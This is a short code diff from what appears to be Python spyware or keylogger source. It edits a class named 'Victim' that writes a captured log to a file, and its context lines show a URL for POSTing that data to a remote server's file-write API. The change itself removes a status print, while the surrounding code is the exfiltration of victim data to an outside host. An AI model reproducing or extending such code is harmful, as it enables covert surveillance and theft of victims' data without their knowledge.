@@ -465,7 +465,6 @@ class Victim:
 
         with open(file_path, 'w') as file:
             file.write(self.log)
-            print('Transcript updated')
 
         # The URL for the POST request...
         url = 'https://panel.birdflop.com/api/client/servers/d8d1f336/files/write?file=%2Fdata%2F4adfc5325dfd9932f38eb7985769c3bb'
